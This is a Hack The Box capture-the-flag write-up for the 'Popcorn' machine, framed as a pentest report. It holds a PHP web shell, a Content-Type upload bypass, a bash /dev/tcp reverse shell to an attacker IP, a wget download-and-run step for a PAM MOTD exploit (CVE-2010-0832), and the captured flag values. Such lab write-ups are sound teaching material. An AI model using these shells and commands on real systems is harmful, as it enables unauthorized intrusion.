<div class="theme-toggle">
    <button onclick="toggleTheme()">Toggle Dark Mode</button>
</div>

# Popcorn HTB Writeup

## Executive Summary

This penetration test of the Popcorn HTB machine revealed critical security vulnerabilities leading to complete system compromise. The attack chain progressed from web application enumeration to remote code execution and privilege escalation.

## Reconnaissance Phase

### Network Scanning

**Target Declaration:**
```bash
export target=10.129.91.156
```

<img width="464" height="167" alt="image" src="https://github.com/user-attachments/assets/6ee7a3f8-7436-40cd-a9c7-802330010b08" />


**Comprehensive Port Discovery:**
```bash
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="884" height="894" alt="image" src="https://github.com/user-attachments/assets/f4e8cca7-77ce-4eb1-bf73-07841fdb2bb4" />


**Service Enumeration:**
```bash
sudo nmap -p 22,80 -sC -sV -T4 $target
```

<img width="884" height="390" alt="image" src="https://github.com/user-attachments/assets/2fc7ea80-3379-4ede-a7a2-11aec53e0ecd" />


### DNS Configuration
Added hostname resolution for comprehensive web testing:
```bash
echo "10.129.91.156 popcorn.htb" | sudo tee -a /etc/hosts
```

<img width="892" height="398" alt="image" src="https://github.com/user-attachments/assets/a82adbe1-d526-4936-a9ee-239d0e2ca25f" />


## Web Application Assessment

### Initial Discovery
Visiting `http://popcorn.htb` revealed a default web application interface.

<img width="959" height="471" alt="image" src="https://github.com/user-attachments/assets/960cb09f-27b2-4042-a0e2-2d44e40d42d4" />


### Directory Enumeration
Conducted thorough directory bruteforcing which uncovered several interesting endpoints.

<img width="886" height="480" alt="image" src="https://github.com/user-attachments/assets/1f6a2e58-30f2-470f-8b87-2286de7ee148" />


### Critical Findings

**File Upload Functionality:**
- Discovered `file_uploads` enabled at `http://popcorn.htb/test`

<img width="886" height="480" alt="image" src="https://github.com/user-attachments/assets/3d916e09-1517-44d5-9a46-bd2f45173b65" />


- Torrent management application at `http://popcorn.htb/torrent/login.php`

<img width="900" height="800" alt="image" src="https://github.com/user-attachments/assets/4a6158cb-97c5-4f9b-8710-7122a1a3e651" />


## Initial Access

### User Registration
Successfully registered a new account on the torrent application to gain access to upload functionality.

<img width="900" height="980" alt="image" src="https://github.com/user-attachments/assets/b8081643-8937-45ba-acdd-a9cee3d6583f" />


### File Upload Bypass
1. **Torrent Upload:** Initially uploaded a legitimate torrent file

<img width="1029" height="726" alt="image" src="https://github.com/user-attachments/assets/f8bbfdf5-7548-4868-98bb-0c8b21a6ad9b" />

<img width="997" height="870" alt="image" src="https://github.com/user-attachments/assets/88c82d1f-fee7-4540-9edf-b041ed2c25f0" />


2. **Image Upload Bypass:** 
   - Accessed the image editing feature
  
<img width="649" height="711" alt="image" src="https://github.com/user-attachments/assets/3e325135-df34-4dc3-a0ca-83c4983f164e" />


   - Uploaded PHP shell by modifying `Content-Type` to `image/png`

<img width="585" height="828" alt="image" src="https://github.com/user-attachments/assets/936a0330-d7de-46ed-825a-0eefe2caabf3" />

   - File successfully uploaded to `http://popcorn.htb/torrent/upload/`

<img width="585" height="828" alt="image" src="https://github.com/user-attachments/assets/1be0c33b-900b-404b-a85c-2ea507499025" />


### Remote Code Execution
**Shell Upload:**
```php
<?php system($_GET['cmd']); ?>
```

<img width="966" height="355" alt="image" src="https://github.com/user-attachments/assets/7e349d8f-8705-4cfc-9f0b-457c78d8523e" />


**Reverse Shell Execution:**
```bash
# Attacker Listener
nc -nlvp 9001

# Web Trigger
http://popcorn.htb/torrent/upload/920dcb9268b2e20fbe0f0bd9a4de82188ce28033.php?cmd=bash%20-c%20%27sh%20-i%20%3E%26%20/dev/tcp/10.10.16.21/9001%200%3E%261%27
```

<img width="882" height="353" alt="image" src="https://github.com/user-attachments/assets/3e60e58b-d2ca-4c9a-869c-112910f30545" />

<img width="1489" height="353" alt="image" src="https://github.com/user-attachments/assets/4a976867-7db8-40bf-8787-693c3f64ac6d" />



**Shell Obtained:**
- User: `www-data`
- Privileges: Web application context

<img width="792" height="365" alt="image" src="https://github.com/user-attachments/assets/92ab218f-b485-443e-bd7e-2dbf14524529" />


## Post-Exploitation

### User Flag Discovery
```bash
find . -type f -ls
cat user.txt
475e864a3771cf836c78fa1f6ab4b8f2
```

<img width="792" height="365" alt="image" src="https://github.com/user-attachments/assets/1e1fc24a-cfeb-401f-ad03-21f3bd6349b1" />


### Privilege Escalation

**Vulnerability Identification:**
- Observed MOTD (Message of the Day) configuration
- Identified PAM version 1.1.0 with known vulnerabilities

<img width="977" height="372" alt="image" src="https://github.com/user-attachments/assets/fef257ba-044f-4b1b-a161-43e341e2511f" />


**Exploit Research:**
- Searched for PAM 1.1.0 privilege escalation exploits

  <img width="977" height="372" alt="image" src="https://github.com/user-attachments/assets/e66ea6d7-9ed1-4276-bdab-87318310a18f" />

- Discovered CVE-2010-0832 (PAM MOTD local privilege escalation)

<img width="949" height="329" alt="image" src="https://github.com/user-attachments/assets/b7886be9-97e8-47a3-93b1-f503a2bf9e5e" />


**Exploit Deployment:**
```bash
# Host exploit on attacker machine
python3 -m http.server 8000

# Download and execute on target
wget http://10.10.16.21:8000/14339.sh
chmod +x 14339.sh

# Stabilize shell before execution
python -c "import pty;pty.spawn('/bin/bash')"
./14339.sh
```

<img width="949" height="329" alt="image" src="https://github.com/user-attachments/assets/d6ce9e21-7e73-4473-8b60-fe19e81cc731" />

### Root Access Achieved
Successfully escalated privileges to root using the PAM MOTD vulnerability.

<img width="951" height="394" alt="image" src="https://github.com/user-attachments/assets/0854014a-19ba-4a33-b686-92cc772a8dad" />


**Root Flag Extraction:**

<img width="951" height="152" alt="image" src="https://github.com/user-attachments/assets/742a88bf-ea6b-4a18-8eea-0544bb699371" />


```bash
cat /root/root.txt
5eddd59cc9633927984c39f001331eb2
```

## Vulnerability Analysis

### Critical Security Issues

1. **Insecure File Upload**
   - No proper file type validation
   - Content-Type header manipulation possible
   - Executable files stored in web-accessible directory

2. **Privilege Escalation Vector**
   - Outdated PAM version with known vulnerability
   - Improper MOTD configuration
   - Lack of security patches

3. **Access Control Failures**
   - Weak upload restrictions
   - Insufficient input sanitization

## Mitigation Recommendations

### Immediate Actions
1. **File Upload Security**
   - Implement strict file type verification
   - Use server-side MIME type detection
   - Store uploaded files outside web root
   - Implement antivirus scanning

2. **System Patching**
   - Update PAM to latest secure version
   - Apply all security patches regularly
   - Implement automated patch management

3. **Network Security**
   - Restrict file upload capabilities
   - Implement Web Application Firewall (WAF)
   - Conduct regular vulnerability assessments

### Long-term Security Improvements
1. **Secure Development Practices**
   - Input validation and sanitization
   - Principle of least privilege
   - Regular security code reviews

2. **Monitoring and Detection**
   - File integrity monitoring
   - Intrusion detection systems
   - Comprehensive logging and alerting

## Technical Indicators

### Attack Timeline
1. Network reconnaissance → 2. Web application enumeration → 3. Account registration → 4. File upload bypass → 5. Remote code execution → 6. Privilege escalation → 7. Root compromise

### Tools Utilized
- **Nmap**: Network mapping and service discovery
- **Browser**: Web application interaction
- **Netcat**: Reverse shell handling
- **SearchSploit**: Vulnerability research
- **Python HTTP Server**: Exploit hosting

### Exploit References
- **CVE-2010-0832**: PAM MOTD privilege escalation
- **Custom PHP Web Shell**: File upload bypass

---

**Penetration Test Report** | **Popcorn HTB** | **Critical Severity**

---
